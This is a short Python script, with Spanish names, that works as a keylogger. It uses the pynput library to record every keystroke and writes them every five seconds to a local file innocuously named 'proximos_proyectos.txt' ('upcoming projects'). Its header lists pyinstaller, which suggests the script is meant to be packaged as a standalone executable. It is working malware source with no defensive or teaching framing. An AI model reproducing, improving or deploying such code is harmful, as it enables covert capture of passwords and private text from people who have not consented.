#py 3.11
#pip install keyboard
#pip install pynput
#pip install pyinstaller

from pynput import keyboard
import threading
import time
import sys
import os
nombre_archivo = "proximos_proyectos.txt"
buffer = []
lock = threading.Lock()
def flush_buffer():
    global buffer
    with lock:
        if buffer:
            try:
                with open(nombre_archivo, "a") as f:
                    f.write("".join(buffer))
                buffer = []
            except Exception as e:
                with open("errores.log", "a") as log:
                    log.write(f"Error: {str(e)}\n")
def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.esc: ' esc ',
        }.get(key, '')
    if char is not None:
        with lock:
            buffer.append(char)
def guardar_automaticamente():
    while True:
        time.sleep(5)
        flush_buffer()
threading.Thread(target=guardar_automaticamente).start()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()